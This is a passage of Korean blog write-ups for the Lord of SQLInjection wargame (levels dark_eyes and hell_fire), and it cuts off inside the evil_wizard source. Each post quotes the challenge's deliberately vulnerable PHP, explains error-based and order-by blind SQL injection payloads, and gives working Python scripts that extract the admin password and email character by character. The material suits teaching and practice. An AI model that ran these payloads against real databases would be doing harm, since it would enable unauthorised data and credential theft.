    <url>/2021/11/27/2021-11-27-Lord_of_SQLInjection_22_dark_eyes/</url>
    <content><![CDATA[<h1 id="🎨-전체-소스코드"><a href="#🎨-전체-소스코드" class="headerlink" title="🎨 전체 소스코드"></a>🎨 전체 소스코드</h1><br>

<p>22번 문제인 dark_eyes를 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
<br>

<img src="/images/Lord of SQLInjection/dark_eyes/source.png">

<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  <span class="variable">$db</span> = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/col|if|case|when|sleep|benchmark/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_dark_eyes where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>(mysqli_error(<span class="variable">$db</span>)) <span class="keyword">exit</span>();</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="variable">$_GET</span>[pw] = addslashes(<span class="variable">$_GET</span>[pw]);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select pw from prob_dark_eyes where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) solve(<span class="string">&quot;dark_eyes&quot;</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<hr>
<br>

<h1 id="🔔-중요-소스코드-해석"><a href="#🔔-중요-소스코드-해석" class="headerlink" title="🔔 중요 소스코드 해석"></a>🔔 중요 소스코드 해석</h1><br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/col|if|case|when|sleep|benchmark/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_dark_eyes where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(mysqli_error(<span class="variable">$db</span>)) <span class="keyword">exit</span>();</span><br><span class="line">  </span><br><span class="line"><span class="variable">$_GET</span>[pw] = addslashes(<span class="variable">$_GET</span>[pw]);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select pw from prob_dark_eyes where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) solve(<span class="string">&quot;dark_eyes&quot;</span>);</span><br></pre></td></tr></table></figure>

<br>

<br>

<h2 id="1-줄-2-줄-해석"><a href="#1-줄-2-줄-해석" class="headerlink" title="1 줄 ~ 2 줄 해석"></a>1 줄 ~ 2 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/col|if|case|when|sleep|benchmark/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>preg_match</code>라는 함수가 있습니다.</p>
<p><code>preg_match</code>함수는 특정한 문자를 필터링할 때 사용합니다.</p>
<p><code>pw 파라미터</code>에서 <code>prob</code> <code>col</code> <code>if</code> <code>case</code> <code>when</code> <code>sleep</code> <code>benchmark</code>  <code>_</code> <code>.</code> <code>()</code> 를 필터링 하고 있습니다. <code>/i</code>는 대소문자를 구분하지 않는다는 뜻입니다.</p>
<br>

<br>

<h2 id="7-줄-해석"><a href="#7-줄-해석" class="headerlink" title="7 줄 해석"></a>7 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[pw] = addslashes(<span class="variable">$_GET</span>[pw]);</span><br></pre></td></tr></table></figure>

<p><code>addslashes</code>함수는 <code>&#39;</code>, <code>&quot;</code>, <code>NULL</code> 같은 특수 문자들을 포함하고 있는 문자열에 <code>\</code>을 넣음으로써 쿼리문에서의 오류를 없애 줍니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🙆‍♀️-SOLVE"><a href="#🙆‍♀️-SOLVE" class="headerlink" title="🙆‍♀️ SOLVE"></a>🙆‍♀️ SOLVE</h1><br>

<p><code>pw</code> 값을 찾아야 하는 <code>Blind SQLi</code>입니다.</p>
<p>이전의 문제와 다른 점은 쿼리문이 참일 때 <code>Hello admin</code>와 같은 문자가 안 뜹니다.</p>
<br>

<p>즉, 참 거짓을 알 수 없기 때문에 <code>Error Based SQLi</code>를 사용해야 합니다.</p>
<p>참 / 거짓을 판별하기 위해 조건문을 사용하여 참이면 에러 발생 X, 거짓이면 에러를 발생 시키는 방법으로 판별할 수 있습니다.</p>
<br>

<p><code>iron_golem</code> 문제와 비슷하지만 에러 문구가 안 뜨고 빈 화면이 뜹니다.</p>
<br>

<p><code>if</code> 함수가 필터링 걸려있기 때문에 다른 방법을 사용해야합니다.</p>
<br>

<p>구글링으로 <code>if</code>함수랑 비슷한 함수를 찾아보았습니다.</p>
<p><code>NVL</code> 함수를 찾았는데 해당 함수는 Oracle SQL 함수였습니다.</p>
<p>구글링을 더 해본 결과 <code>COALESCE</code>라는 함수가 있었습니다.</p>
<br>

<p><code>SELECT COALESCE(컬럼1, 컬럼2) FROM TABLE_NAME</code></p>
<p>해당 함수는 <code>컬럼1</code>이 NULL 이면 <code>컬럼2</code>를 출력하고,</p>
<p><code>컬럼1</code>이 NULL 이 아니라면 <code>컬럼1</code>을 출력합니다.</p>
<br>

<br>

<p>일단 <code>pw</code>의 길이를 구하기 위한 쿼리문은 아래와 같습니다.</p>
<p><code>&#39; or id=&#39;admin&#39; and coalesce((select id where id=&#39;admin&#39; and length(pw)=&#39;&#123;&#125;&#39;),(select 1 union select 2))%23</code></p>
<p><code>i</code> 값을 증가 시키면서 <code>pw</code>의 길이를 구해주면 됩니다.</p>
<br>

<br>

<p><code>pw</code>의 길이를 구하면 한 글자 씩 추출하여 패스워드를 찾으면 됩니다.</p>
<p><code>pw</code>를 찾기 위한 쿼리문은 아래와 같습니다.</p>
<p><code>&#39; or id=&#39;admin&#39; and coalesce((select id where id=&#39;admin&#39; and substr(pw,&#123;&#125;,1)=&#39;&#123;&#125;&#39;),(select 1 union select 2))%23</code></p>
<p><code>substr</code> 함수로 한 글자 씩 추출하여 <code>pw</code>를 찾습니다.</p>
<br>

<br>

<h2 id="파이썬-코드"><a href="#파이썬-코드" class="headerlink" title="파이썬 코드"></a>파이썬 코드</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php?pw=&quot;</span></span><br><span class="line">head = &#123;<span class="string">&#x27;Cookie&#x27;</span> : <span class="string">&#x27;PHPSESSID=hs9ec08q7cfg9e4b8opujaufgg&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">length = <span class="number">1</span></span><br><span class="line">pwd = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    query = <span class="string">&quot;&#x27; or id=&#x27;admin&#x27; and coalesce((select id where id=&#x27;admin&#x27; and length(pw)=&#x27;&#123;&#125;&#x27;),(select 1 union select 2))%23&quot;</span>.<span class="built_in">format</span>(length)</span><br><span class="line">    req = requests.get(url+query, headers=head)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[ +&quot;</span>,length,<span class="string">&quot;]&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;query&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;총 길이는&quot;</span>,length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        length += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">122</span>):</span><br><span class="line">        query = <span class="string">&quot;&#x27; or id=&#x27;admin&#x27; and coalesce((select id where id=&#x27;admin&#x27; and substr(pw,&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;),(select 1 union select 2))%23&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i),<span class="built_in">chr</span>(j))</span><br><span class="line">        req = requests.get(url+query, headers=head)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;query&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            pwd += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(i,<span class="string">&quot;번째 문자 찾는 중 .. : &quot;</span>,pwd)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">            </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;pw : &quot;</span>,pwd)</span><br></pre></td></tr></table></figure>



<br>

<img src="/images/Lord of SQLInjection/dark_eyes/solve_1.png">

<br>

<p><code>pw</code>의 길이를 구해 줍니다.</p>
<br>

<br>

<img src="/images/Lord of SQLInjection/dark_eyes/solve_2.png">

<br>

<p><code>pw</code>를 한 글자 씩 추출하여 구해 줍니다.</p>
<br>

<br>

<img src="/images/Lord of SQLInjection/dark_eyes/solve_3.png">

<br>

<p>찾은 <code>pw</code>를 패스워드에 넣어 풀어주면 됩니다.</p>
<p>** 파이썬에서 패스워드가 대문자로 추출됩니다. 그 이유는 MySQL에서는 대소문자 구분이 없기 때문에 아스키 코드가 더 작은 대문자로 추출됩니다. 소문자로 바꿔주어 넣어주면 됩니다.</p>
<br>

<br>

<blockquote>
<p>SOLVED !!!</p>
</blockquote>
]]></content>
      <categories>
        <category>Lord of SQLInjection</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Write UP</tag>
      </tags>
  </entry>
  <entry>
    <title>[Lord of SQLInjection] [23번_hell_fire] Write UP</title>
    <url>/2021/11/27/2021-11-27-Lord_of_SQLInjection_23_hell_fire/</url>
    <content><![CDATA[<h1 id="🎨-전체-소스코드"><a href="#🎨-전체-소스코드" class="headerlink" title="🎨 전체 소스코드"></a>🎨 전체 소스코드</h1><br>

<p>23번 문제인 hell_fire를 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
<br>

<img src="/images/Lord of SQLInjection/hell_fire/source.png">

<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  <span class="variable">$db</span> = dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|proc|union/i&#x27;</span>, <span class="variable">$_GET</span>[order])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id,email,score from prob_hell_fire where 1 order by <span class="subst">&#123;$_GET[order]&#125;</span>&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;table border=1&gt;&lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;email&lt;/th&gt;&lt;th&gt;score&lt;/th&gt;&quot;</span>;</span><br><span class="line">  <span class="variable">$rows</span> = mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>);</span><br><span class="line">  <span class="keyword">while</span>((<span class="variable">$result</span> = mysqli_fetch_array(<span class="variable">$rows</span>)))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&quot;admin&quot;</span>) <span class="variable">$result</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&quot;**************&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;<span class="subst">&#123;$result[id]&#125;</span>&lt;/td&gt;&lt;td&gt;<span class="subst">&#123;$result[email]&#125;</span>&lt;/td&gt;&lt;td&gt;<span class="subst">&#123;$result[score]&#125;</span>&lt;/td&gt;&lt;/tr&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;/table&gt;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$_GET</span>[email] = addslashes(<span class="variable">$_GET</span>[email]);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select email from prob_hell_fire where id=&#x27;admin&#x27; and email=&#x27;<span class="subst">&#123;$_GET[email]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;email&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;email&#x27;</span>] === <span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>])) solve(<span class="string">&quot;hell_fire&quot;</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<hr>
<br>

<h1 id="🔔-중요-소스코드-해석"><a href="#🔔-중요-소스코드-해석" class="headerlink" title="🔔 중요 소스코드 해석"></a>🔔 중요 소스코드 해석</h1><br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|proc|union/i&#x27;</span>, <span class="variable">$_GET</span>[order])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id,email,score from prob_hell_fire where 1 order by <span class="subst">&#123;$_GET[order]&#125;</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$rows</span> = mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>);</span><br><span class="line"><span class="keyword">while</span>((<span class="variable">$result</span> = mysqli_fetch_array(<span class="variable">$rows</span>)))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&quot;admin&quot;</span>) <span class="variable">$result</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&quot;**************&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;<span class="subst">&#123;$result[id]&#125;</span>&lt;/td&gt;&lt;td&gt;<span class="subst">&#123;$result[email]&#125;</span>&lt;/td&gt;&lt;td&gt;<span class="subst">&#123;$result[score]&#125;</span>&lt;/td&gt;&lt;/tr&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/table&gt;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[email] = addslashes(<span class="variable">$_GET</span>[email]);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select email from prob_hell_fire where id=&#x27;admin&#x27; and email=&#x27;<span class="subst">&#123;$_GET[email]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;email&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;email&#x27;</span>] === <span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>])) solve(<span class="string">&quot;hell_fire&quot;</span>);</span><br></pre></td></tr></table></figure>

<br>

<br>

<h2 id="1-줄-해석"><a href="#1-줄-해석" class="headerlink" title="1 줄 해석"></a>1 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|proc|union/i&#x27;</span>, <span class="variable">$_GET</span>[order])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>preg_match</code>라는 함수가 있습니다.</p>
<p><code>preg_match</code>함수는 특정한 문자를 필터링할 때 사용합니다.</p>
<p><code>order 파라미터</code>에서 <code>prob</code> <code>proc</code> <code>union</code>  <code>_</code> <code>.</code>  를 필터링 하고 있습니다. <code>/i</code>는 대소문자를 구분하지 않는다는 뜻입니다.</p>
<br>

<br>

<h2 id="6-줄-해석"><a href="#6-줄-해석" class="headerlink" title="6 줄 해석"></a>6 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&quot;admin&quot;</span>) <span class="variable">$result</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&quot;**************&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><code>admin</code>의 <code>email</code>을 필터링하고있습니다.</p>
<br>

<br>

<h2 id="11-줄-해석"><a href="#11-줄-해석" class="headerlink" title="11 줄 해석"></a>11 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[email] = addslashes(<span class="variable">$_GET</span>[email]);</span><br></pre></td></tr></table></figure>

<p><code>addslashes</code>함수는 <code>&#39;</code>, <code>&quot;</code>, <code>NULL</code> 같은 특수 문자들을 포함하고 있는 문자열에 <code>\</code>을 넣음으로써 쿼리문에서의 오류를 없애 줍니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🙆‍♀️-SOLVE"><a href="#🙆‍♀️-SOLVE" class="headerlink" title="🙆‍♀️ SOLVE"></a>🙆‍♀️ SOLVE</h1><br>

<p><code>email</code>의 값을 찾아야 하는 <code>Blind SQLi</code>입니다.</p>
<p><code>order by</code> 절을 이용하여 문제를 풀어야 합니다.</p>
<br>

<br>

<p>저는 아래 사진과 같이 정렬 순서로 참 / 거짓을 판별하여 <code>email</code>을 찾아내었습니다.</p>
<br>

<img src="/images/Lord of SQLInjection/hell_fire/solve_1.png">

<br>

<p><code>if(조건, 참일 때 결과, 거짓일 때 결과)</code>를 사용해주면 됩니다.</p>
<br>

<p>참 일 때 결과를 <code>admin</code> 행이 첫 번째로 오도록 만들어주었고, 거짓일 때 <code>rubiya</code> 행이 첫 번째로 오도록 만들어주었습니다.</p>
<br>

<img src="/images/Lord of SQLInjection/hell_fire/solve_1.png">

<br>

<blockquote>
<p>참</p>
</blockquote>
<br>

<br>

<hr>
<img src="/images/Lord of SQLInjection/hell_fire/solve_2.png">

<br>

<blockquote>
<p>거짓</p>
</blockquote>
<br>

<br>

<p><code>email</code>의 길이를 구하기 위한 쿼리문은 아래와 같습니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(id=&#x27;admin&#x27; and length(email)=&#x27;&#123; i &#125;&#x27;,1,3)%23</span><br></pre></td></tr></table></figure>

<p><code>i</code> 값을 증가 시키면서 <code>email</code>의 길이를 구해주면 됩니다.</p>
<br>

<br>

<p><code>email</code>의 길이를 구하면 한 글자 씩 추출하여 패스워드를 찾으면 됩니다.</p>
<p><code>email</code>를 찾기 위한 쿼리문은 아래와 같습니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(id=&#x27;admin&#x27; and substr(email,&#123; i &#125;,1)=&#x27;&#123; j &#125;&#x27;,1,3)%23</span><br></pre></td></tr></table></figure>

<p><code>substr</code> 함수로 한 글자 씩 추출하여 <code>pw</code>를 찾습니다.</p>
<br>

<br>

<h2 id="파이썬-코드"><a href="#파이썬-코드" class="headerlink" title="파이썬 코드"></a>파이썬 코드</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php?order=&quot;</span></span><br><span class="line">head = &#123;<span class="string">&#x27;Cookie&#x27;</span> : <span class="string">&#x27;PHPSESSID=값&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">length = <span class="number">1</span></span><br><span class="line">email = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    query = <span class="string">&quot;if(id=&#x27;admin&#x27; and length(email)=&#x27;&#123;&#125;&#x27;,1,3)%23&quot;</span>.<span class="built_in">format</span>(length)</span><br><span class="line">    req = requests.get(url+query, headers=head)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[ +&quot;</span>,length,<span class="string">&quot;]&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&lt;td&gt;200&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;rubiya&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;총 길이는&quot;</span>,length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        length += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">122</span>):</span><br><span class="line">        query = <span class="string">&quot;if(id=&#x27;admin&#x27; and substr(email,&#123;&#125;,1)=char(&#123;&#125;),1,3)%23&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i), j)</span><br><span class="line">        req = requests.get(url+query, headers=head)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;&lt;td&gt;200&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;rubiya&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            email += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(i,<span class="string">&quot;번째 문자 찾는 중 .. : &quot;</span>,email)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">            </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;EMAIL : &quot;</span>,email.lower())</span><br></pre></td></tr></table></figure>



<br>

<br>

<img src="/images/Lord of SQLInjection/hell_fire/solve_3.png">

<br>

<p><code>email</code>의 길이입니다.</p>
<br>

<br>

<img src="/images/Lord of SQLInjection/hell_fire/solve_4.png">

<br>

<p><code>email</code>를 한 글자 씩 추출하여 구해 줍니다.</p>
<br>

<br>

<img src="/images/Lord of SQLInjection/hell_fire/solve_5.png">

<br>

<p>아스키코드 48 번부터 122 번까지 해서 <code>.</code>이 안 나왔는데 추측으로 <code>.</code>을 넣어주었습니다.</p>
<p>** 파이썬에서 패스워드가 대문자로 추출됩니다. 그 이유는 MySQL에서는 대소문자 구분이 없기 때문에 아스키 코드가 더 작은 대문자로 추출됩니다. 소문자로 바꿔주어 넣어주면 됩니다.</p>
<br>

<br>

<blockquote>
<p>SOLVED !!!</p>
</blockquote>
]]></content>
      <categories>
        <category>Lord of SQLInjection</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Write UP</tag>
      </tags>
  </entry>
  <entry>
    <title>[Lord of SQLInjection] [24번_evil_wizard] Write UP</title>
    <url>/2021/11/27/2021-11-27-Lord_of_SQLInjection_24_evil_wizard/</url>
    <content><![CDATA[<h1 id="🎨-전체-소스코드"><a href="#🎨-전체-소스코드" class="headerlink" title="🎨 전체 소스코드"></a>🎨 전체 소스코드</h1><br>

<p>24번 문제인 evil_wizard를 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
<br>

<img src="/images/Lord of SQLInjection/evil_wizard/source.png">

<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  <span class="variable">$db</span> = dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|proc|union|sleep|benchmark/i&#x27;</span>, <span class="variable">$_GET</span>[order])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id,email,score from prob_evil_wizard where 1 order by <span class="subst">&#123;$_GET[order]&#125;</span>&quot;</span>; <span class="comment">// same with hell_fire? really?</span></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;table border=1&gt;&lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;email&lt;/th&gt;&lt;th&gt;score&lt;/th&gt;&quot;</span>;</span><br><span class="line">  <span class="variable">$rows</span> = mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>);</span><br><span class="line">  <span class="keyword">while</span>((<span class="variable">$result</span> = mysqli_fetch_array(<span class="variable">$rows</span>)))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&quot;admin&quot;</span>) <span class="variable">$result</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&quot;**************&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;<span class="subst">&#123;$result[id]&#125;</span>&lt;/td&gt;&lt;td&gt;<span class="subst">&#123;$result[email]&#125;</span>&lt;/td&gt;&lt;td&gt;<span class="subst">&#123;$result[score]&#125;</span>&lt;/td&gt;&lt;/tr&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;/table&gt;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$_GET</span>[email] = addslashes(<span class="variable">$_GET</span>[email]);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select email from prob_evil_wizard where id=&#x27;admin&#x27; and email=&#x27;<span class="subst">&#123;$_GET[email]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;email&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span 